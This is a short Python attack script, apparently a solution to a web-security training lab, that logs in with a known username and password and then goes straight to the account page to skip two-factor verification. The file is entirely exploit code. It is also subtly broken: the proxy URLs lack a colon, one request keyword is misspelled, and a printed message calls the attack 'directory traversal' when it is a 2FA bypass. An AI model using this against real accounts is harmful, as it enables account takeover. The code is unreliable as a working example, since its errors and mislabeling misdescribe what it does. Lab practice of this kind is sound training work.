import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def access_carlos_user(s, url):
    #Login to carlos account
    print("(+) Logging in to carlos's account and bypassing 2FA verification...")
    login_url = url + '/login'
    login_data = {'username':'carlos', 'password':'montoya'}
    r = s.post(login_url, data=login_data, allow_redirect=False, verify=False, proxies=proxies)
    #Confirm bypass 
    myaccount_url = url + '/my-account'
    r = s.get(myaccount_url, verify=False, proxies=proxies)
    #Confirmation of success
    if "log out" in r.text:
        print('(+) You successfully solved the lab ')
    else:
        print('(+) You failed to solve the lab ')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    print("(+) Exploiting the directory traversal vulnerability... ")
    access_carlos_user(s, url)

if __name__ == '__main__':
    main()